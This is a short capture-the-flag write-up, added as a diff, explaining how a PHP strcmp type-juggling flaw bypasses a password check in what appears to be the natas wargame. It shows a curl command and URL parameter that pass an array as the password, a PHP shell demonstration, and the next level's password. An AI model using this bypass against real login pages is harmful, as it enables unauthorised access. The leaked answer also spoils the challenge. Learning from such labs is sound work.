@@ -1,0 +1,24 @@
+The first thing I did was go to the documentation page for php's strcmp
+function. I've been referring to php's documentation for a lot of these
+problems, it's a simple google search:
+
+https://www.php.net/manual/en/function.strcmp.php
+
+In one of the comments a user told of this vulnerability:
+
+curl -d password[]=wrong http://andersk.scripts.mit.edu/strcmp.php
+
+This takes advantage of some peculiar syntax in php. This will both create a key
+called password and assign to it an array with wrong as a value. In my case I
+just typed ?passwd[]="" at the end of the url in my web browser for the lab web
+page.
+
+I opened up a php shell, this is essentially the comparison taking place.
+
+php > echo strcmp(array(), "") == 0 ? "yes" : "no";
+echo strcmp(array(), "") == 0 ? "yes" : "no";
+PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
+yes
+php > echo strcmp(array(), "") == 0 ? "yes" : "no";
+
+natas25 password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
